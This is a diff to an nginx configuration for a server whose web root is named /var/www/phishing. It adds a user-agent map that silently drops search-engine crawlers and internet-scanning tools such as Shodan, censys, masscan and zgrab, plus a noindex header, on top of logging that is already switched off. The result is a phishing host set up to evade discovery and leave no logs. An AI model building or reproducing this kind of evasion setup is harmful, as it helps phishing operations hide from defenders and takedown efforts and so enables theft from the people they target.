@@ -1,10 +1,38 @@
+map $http_user_agent $block_scanner {
+    default 0;
+    ~*Googlebot 1;
+    ~*bingbot 1;
+    ~*Slurp 1;
+    ~*DuckDuckBot 1;
+    ~*Baiduspider 1;
+    ~*YandexBot 1;
+    ~*Sogou 1;
+    ~*Exabot 1;
+    ~*facebot 1;
+    ~*ia_archiver 1;
+    ~*msnbot 1;
+    ~*AhrefsBot 1;
+    ~*SemrushBot 1;
+    ~*MJ12bot 1;
+    ~*DotBot 1;
+    ~*BLEXBot 1;
+    ~*masscan 1;
+    ~*zgrab 1;
+    ~*Shodan 1;
+    ~*censys 1;
+}
+
 server {
     listen 80;
     server_name _;
-    
+
+    add_header X-Robots-Tag "noindex, noarchive";
+
+    if ($block_scanner) { return 444; }
+
     root /var/www/phishing;
     index index.html index.php;
-    
+
     # Disable all logging
     access_log off;
     error_log /dev/null crit;
